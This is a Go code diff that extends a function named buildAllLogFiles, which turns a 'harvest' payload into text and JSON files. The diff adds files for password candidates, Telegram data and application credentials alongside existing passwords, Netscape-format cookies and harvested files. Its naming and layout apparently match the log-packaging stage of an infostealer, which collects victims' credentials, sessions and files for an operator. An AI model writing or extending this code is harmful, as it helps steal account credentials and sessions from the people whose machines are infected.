@@ -24,6 +24,12 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	if data := passwordsLog(r.Passwords); len(data) > 0 {
 		out["passwords.txt"] = data
 	}
+	if data := passwordCandidatesLog(r.PasswordCandidates); len(data) > 0 {
+		out["password_candidates.txt"] = data
+	}
+	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
+		out["password_candidates.json"] = data
+	}
 	if data := cookiesNetscape(p); len(data) > 0 {
 		out["cookies.txt"] = data
 	}
@@ -57,6 +63,12 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	if data := jsonLog("files.json", r.Files); len(data) > 0 {
 		out["files.json"] = data
 	}
+	if data := jsonLog("telegram.json", r.Telegram); len(data) > 0 {
+		out["telegram.json"] = data
+	}
+	if data := appCredentialsLog(r.AppCredentials); len(data) > 0 {
+		out["app_credentials.txt"] = data
+	}
 	if data := jsonLog("app_credentials.json", r.AppCredentials); len(data) > 0 {
 		out["app_credentials.json"] = data
 	}
@@ -74,6 +86,58 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 		out["harvest.json"] = data
 	}
 	return out
+}
+
+func appCredentialsLog(rows []recovery.AppCredentialResult) []byte {
+	if len(rows) == 0 {
+		return nil
+	}
+	var b bytes.Buffer
+	for i, row := range rows {
+		if i > 0 {
+			b.WriteString("\n")
+		}
+		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+		fmt.Fprintf(&b, "Application: %s\n", row.Application)
+		if row.Host != "" {
+			fmt.Fprintf(&b, "Host: %s\n", row.Host)
+		}
+		if row.Port > 0 {
+			fmt.Fprintf(&b, "Port: %d\n", row.Port)
+		}
+		if row.Username != "" {
+			fmt.Fprintf(&b, "Username: %s\n", row.Username)
+		}
+		if row.Password != "" {
+			fmt.Fprintf(&b, "Password: %s\n", row.Password)
+		}
+		if row.Protocol != "" {
+			fmt.Fprintf(&b, "Protocol: %s\n", row.Protocol)
+		}
+		if row.Extra != "" {
+			fmt.Fprintf(&b, "Extra: %s\n", row.Extra)
+		}
+	}
+	return b.Bytes()
+}
+
+func passwordCandidatesLog(rows []recovery.PasswordCandidateResult) []byte {
+	if len(rows) == 0 {
+		return nil
+	}
+	var b bytes.Buffer
+	for i, row := range rows {
+		if i > 0 {
+			b.WriteString("\n")
+		}
+		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+		fmt.Fprintf(&b, "Source: %s\n", row.Source)
+		if row.Detail != "" {
+			fmt.Fprintf(&b, "Detail: %s\n", row.Detail)
+		}
+		fmt.Fprintf(&b, "Password: %s\n", row.Password)
+	}
+	return b.Bytes()
 }
 
 func passwordsLog(rows []recovery.PasswordResult) []byte {
